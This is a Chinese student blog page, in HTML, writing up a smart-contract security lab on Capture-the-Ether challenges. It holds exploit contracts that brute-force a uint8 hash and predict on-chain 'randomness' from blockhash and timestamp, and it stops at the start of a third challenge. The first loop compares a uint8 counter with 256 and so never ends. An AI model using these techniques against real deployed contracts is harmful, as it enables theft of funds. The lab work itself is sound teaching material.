@@ -1,0 +1,1165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="dawn_r1sing">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://dawnringDong.github.io/2025/07/11/竞学实训（3）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="实验Smart Contract  一切还在掌控之中  一．实验目的通过破解以太坊智能合约来了解智能合约的漏洞类型。 二．实验内容（一） 本地部署靶场 参看“参考资料”中的内容或自行搜索资料，完成以下实验。  1. 安装foundry，并将repo clone到本地。 参考官方安装文档或自行查找资料，安装好foundry；将repo clone到本地。（请描述过程遇到了哪些问题？是如何解决的？）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="竞学实训（3）">
+<meta property="og:url" content="http://dawnringdong.github.io/2025/07/11/%E7%AB%9E%E5%AD%A6%E5%AE%9E%E8%AE%AD%EF%BC%883%EF%BC%89/index.html">
+<meta property="og:site_name" content="dawn">
+<meta property="og:description" content="实验Smart Contract  一切还在掌控之中  一．实验目的通过破解以太坊智能合约来了解智能合约的漏洞类型。 二．实验内容（一） 本地部署靶场 参看“参考资料”中的内容或自行搜索资料，完成以下实验。  1. 安装foundry，并将repo clone到本地。 参考官方安装文档或自行查找资料，安装好foundry；将repo clone到本地。（请描述过程遇到了哪些问题？是如何解决的？）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217223.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217226.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052219403.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217234.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052221630.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052221636.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217880.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052223447.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217399.jpg">
+<meta property="article:published_time" content="2025-07-11T14:17:12.000Z">
+<meta property="article:modified_time" content="2025-11-08T03:44:08.496Z">
+<meta property="article:author" content="dawn_r1sing">
+<meta property="article:tag" content="实验">
+<meta property="article:tag" content="课内学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217223.jpg">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310311001858.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310311001858.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310311001858.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            竞学实训（3） -
+        
+        dawn_r1sing
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        dawn_r1sing
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"dawnringdong.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"dawn_r1sing","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn?c=d&c=i&c=j&c=k&c=i"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":"xiaoran_dong@163.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-home# can be empty"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/29 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                dawn_r1sing
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-home# can be empty fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-home# can be empty fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">33</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">竞学实训（3）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310291726035.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">dawn_r1sing</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-11 22:17:12</span>
+        <span class="mobile">2025-07-11 22:17:12</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-08 11:44:08</span>
+            <span class="mobile">2025-11-08 11:44:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%AE%9E%E9%AA%8C/">实验</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E8%AF%BE%E5%86%85%E5%AD%A6%E4%B9%A0/">课内学习</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>14 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="实验Smart-Contract"><a href="#实验Smart-Contract" class="headerlink" title="实验Smart Contract"></a>实验Smart Contract</h1><blockquote>
+<p> 一切还在掌控之中</p>
+</blockquote>
+<h2 id="一．实验目的"><a href="#一．实验目的" class="headerlink" title="一．实验目的"></a><strong>一．实验目的</strong></h2><p>通过破解以太坊智能合约来了解智能合约的漏洞类型。</p>
+<h2 id="二．实验内容"><a href="#二．实验内容" class="headerlink" title="二．实验内容"></a>二．<strong>实验内容</strong></h2><h4 id="（一）-本地部署靶场"><a href="#（一）-本地部署靶场" class="headerlink" title="（一） 本地部署靶场"></a>（一） <strong>本地部署靶场</strong></h4><blockquote>
+<p>参看“参考资料”中的内容或自行搜索资料，完成以下实验。</p>
+</blockquote>
+<h5 id="1-安装foundry，并将repo-clone到本地。"><a href="#1-安装foundry，并将repo-clone到本地。" class="headerlink" title="1. 安装foundry，并将repo clone到本地。"></a>1. <strong>安装foundry，并将repo</strong> <strong>clone到本地。</strong></h5><blockquote>
+<p>参考官方安装文档或自行查找资料，安装好foundry；将repo clone到本地。（请描述过程遇到了哪些问题？是如何解决的？）</p>
+</blockquote>
+<p>为了解决网络问题以及出于习惯考虑，我使用的是wsl进行本实验。由于在之前的Malware Analysis实验中为了配置Cuckoo Sandbox关闭了window11主机的虚拟化，首先要做的是打开hyper-v恢复虚拟化支持。使用二进制脚本安装（太慢了，直接下载release）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217223.jpg"
+                      alt="img"
+                > </p>
+<p> 在wsl编译的同时（问GPT回答说可以自己编译foundry兼容当前 glibc，尝试失败），我在虚拟机中也尝试，报错如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217226.jpg"
+                      alt="img"
+                ></p>
+<p>原因是glibc 版本，最合适的解决方法是使用ubuntu 22.04+，为了节省时间，我同时下载Ubuntu22.04镜像和旧版本foundry（emm旧版本也都不支持，只能等待ubunutu22.04镜像）。</p>
+<p>镜像下载过程中，我发现干脆安装一个ubuntu 22.04的wsl更快，因此我选择使用wsl ubuntu 22.04完成此实验。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052219403.jpg"
+                      alt="img"
+                > </p>
+<h4 id="（二）-实验"><a href="#（二）-实验" class="headerlink" title="（二） 实验"></a>（二） <strong>实验</strong></h4><blockquote>
+<p><em><strong>靶场用法：</strong></em>在capture-the-ether-foundry&#x2F;目录中：</p>
+<ol>
+<li><p>阅读实验问题及其源码（.&#x2F;PROBLEM_NAME&#x2F;src&#x2F;PROBLEM_NAME.sol）里 &#x2F;&#x2F;Write your exploit codes below之前的内容，找出其漏洞所在。</p>
+</li>
+<li><p>cd到实验问题所在目录（.&#x2F;PROBLEM_NAME&#x2F;），然后在：</p>
+<ol>
+<li>测试（.&#x2F;PROBLEM_NAME&#x2F;test&#x2F;PROBLEM_NAME.t.sol）中的 &#x2F;&#x2F; Put your solution here （或是相同意思的注释）处添加你的解决方案（攻击代码）；</li>
+<li>源码（.&#x2F;PROBLEM_NAME&#x2F;src&#x2F;PROBLEM_NAME.sol）中的&#x2F;&#x2F; Write your exploit codes below（或是相同意思的注释）处写解决方案（攻击代码）。</li>
+<li>编写完解决方案后，cd到问题所在目录（.&#x2F;PROBLEM_NAME&#x2F;），使用forge test运行测试以检验攻击成果。</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<h5 id="1-Guess-secret-number"><a href="#1-Guess-secret-number" class="headerlink" title="1. Guess secret number"></a>1. <strong>Guess secret number</strong></h5><blockquote>
+<p>将答案直接写入代码会让事情变得太过简单，因此这次只存储了这个数字的哈希值。</p>
+<p>目标：破解这个哈希值。（附上添加的解决方案代码、思路解释，以及解决方案运行成功的截图）</p>
+</blockquote>
+<p>本质上就是穷举数字比对hash值。因为这个数字是uint8类型，穷举搜索是实际可行的，只需要遍历0-256计算hash值与answerHash比对，相等时对应的数字即为所求。</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Write your exploit codes below</span></span><br><span class="line"></span><br><span class="line">contract ExploitContract &#123;</span><br><span class="line"></span><br><span class="line">  bytes32 answerHash =</span><br><span class="line"></span><br><span class="line">​    <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Exploiter</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint8)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    uint8 n;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span>(uint8 i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line"></span><br><span class="line">​    &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span> (<span class="built_in">keccak256</span>(abi.<span class="built_in">encodePacked</span>(i)) == answerHash) &#123;</span><br><span class="line"></span><br><span class="line">​        n = i;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> n;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217234.jpg"
+                      alt="img"
+                > </p>
+<h5 id="2-Guess-random-number"><a href="#2-Guess-random-number" class="headerlink" title="2. Guess random number"></a>2. <strong>Guess random number</strong></h5><blockquote>
+<p>这次的数字是基于几个相当随机的来源生成的。</p>
+<p>目标：猜出随机数。</p>
+<p>提示：</p>
+<p>（1） SWC-136：链上未加密的私有数据；</p>
+<p>（2） Ethernaut挑战#8解决方案 — Vault。</p>
+<p>（附上添加的解决方案代码、思路解释，以及解决方案运行成功的截图）</p>
+</blockquote>
+<p>相较于上一题，这次的数字是随机生成的。相当于是在模拟真实合约中的不安全场景：使用上一个block的信息生成随机数。而这些数据对于攻击者来说都是容易获得的，因此容易伪造。具体而言是依赖于上一个block的hash值和时间戳，因此只需要模仿answer的生成方式即可猜出随机数。</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Write your exploit codes below</span></span><br><span class="line"></span><br><span class="line">contract ExploitContract &#123;</span><br><span class="line"></span><br><span class="line">  GuessRandomNumber <span class="keyword">public</span> guessRandomNumber;</span><br><span class="line"></span><br><span class="line">  uint8 <span class="keyword">public</span> answer;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(uint8)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    answer = <span class="built_in">uint8</span>(</span><br><span class="line"></span><br><span class="line">​      <span class="built_in">uint256</span>(</span><br><span class="line"></span><br><span class="line">​        <span class="built_in">keccak256</span>(</span><br><span class="line"></span><br><span class="line">​          abi.<span class="built_in">encodePacked</span>(</span><br><span class="line"></span><br><span class="line">​            <span class="built_in">blockhash</span>(block.number - <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">​            block.timestamp</span><br><span class="line"></span><br><span class="line">​          )</span><br><span class="line"></span><br><span class="line">​        )</span><br><span class="line"></span><br><span class="line">​      )</span><br><span class="line"></span><br><span class="line">​    );</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> answer;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052221630.jpg"
+                      alt="img"
+                > </p>
+<h5 id="3-Guess-new-number"><a href="#3-Guess-new-number" class="headerlink" title="3. Guess new number"></a>3. <strong>Guess new number</strong></h5><blockquote>
+<p>该数字现在会在进行猜测时按需生成。</p>
+<p>目标：猜中合约中answer的值</p>
+<p>（附上添加的解决方案代码、思路解释，以及解决方案运行成功的截图）</p>
+</blockquote>
